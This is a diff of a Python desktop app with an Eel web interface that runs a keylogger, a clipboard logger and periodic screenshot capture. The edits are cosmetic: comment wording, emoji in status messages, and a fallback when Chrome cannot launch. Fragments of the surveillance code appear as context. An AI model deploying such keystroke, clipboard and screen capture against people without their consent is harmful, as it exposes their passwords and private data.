@@ -17,7 +17,7 @@ eel.init("web")
 is_logging = False
 key_listener = None
 
-# Encryption key (store securely in production)
+# Encryption key (For production: store securely)
 fernet_key = Fernet.generate_key()
 cipher = Fernet(fernet_key)
 
@@ -53,7 +53,7 @@ setup_database()
 
 # Clipboard logger
 def log_clipboard():
-    time.sleep(5)  # Delay to ensure stability
+    time.sleep(5)  # Delay for stability
     previous_clipboard = ""
     while True:
         try:
@@ -72,7 +72,7 @@ def log_clipboard():
 
 # Screenshot capture
 def periodic_screenshot():
-    time.sleep(5)  # Delay to ensure UI loads
+    time.sleep(5)
     while True:
         try:
             screenshot = pyautogui.screenshot()
@@ -114,7 +114,7 @@ def start_logging():
         is_logging = True
         key_listener = keyboard.Listener(on_press=on_press)
         key_listener.start()
-        print("Keylogger started")
+        print("✅ Keylogger started")
         return "Keylogger started."
     return "Keylogger already running."
 
@@ -126,7 +126,7 @@ def stop_logging():
     if key_listener is not None:
         key_listener.stop()
         key_listener = None
-        print("Keylogger stopped")
+        print("🛑 Keylogger stopped")
         return "Keylogger stopped."
     return "Keylogger was not running."
 
@@ -135,8 +135,14 @@ threading.Thread(target=log_clipboard, daemon=True).start()
 threading.Thread(target=periodic_screenshot, daemon=True).start()
 
 # Launch Eel UI
-eel.start("index.html", mode='chrome', port=8000, block=False)
+try:
+    eel.start("index.html", mode='chrome', port=8000, block=False)
+except EnvironmentError:
+    print("⚠️ Couldn't launch Chrome automatically. Open http://localhost:8000 manually.")
+    eel.start("index.html", mode=None, port=8000, block=False)
 
-# Keep running
+print("🌐 Eel launched at http://localhost:8000")
+
+# Keep app running
 while True:
     time.sleep(1)
